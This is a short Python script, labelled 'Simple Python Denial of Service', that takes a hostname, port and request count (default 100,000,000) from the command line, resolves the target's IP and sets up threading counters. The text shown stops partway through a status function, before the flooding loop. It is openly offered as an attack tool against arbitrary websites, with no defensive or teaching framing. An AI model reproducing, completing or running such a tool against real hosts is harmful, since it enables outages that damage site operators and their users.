#Simple Python Denial of Service

import random
import socket
import string
import sys
import threading
import time

host = ""
ip = ""
port = 0
num_requests = 0

# inputs
if len(sys.argv) == 2:
    port = 80
    num_requests = 100000000
elif len(sys.argv) == 3:
    port = int(sys.argv[2])
    num_requests = 100000000
elif len(sys.argv) == 4:
    port = int(sys.argv[2])
    num_requests = int(sys.argv[3])
else:
    print(f"ERROR\nUsage: {sys.argv[0]} <Hostname> <Port> <Number_of_Attacks>")
    sys.exit(1)

# resolve IP
try:
    host = str(sys.argv[1]).replace("https://", "").replace("http://", "").replace("www.", "")
    ip = socket.gethostbyname(host)
except socket.gaierror:
    print("ERROR\nWrong Site Dumbass")
    sys.exit(2)

thread_num = 0
thread_num_mutex = threading.Lock()

def print_status():
    global thread_num
    thread_num_mutex.acquire(True)

    thread_num += 1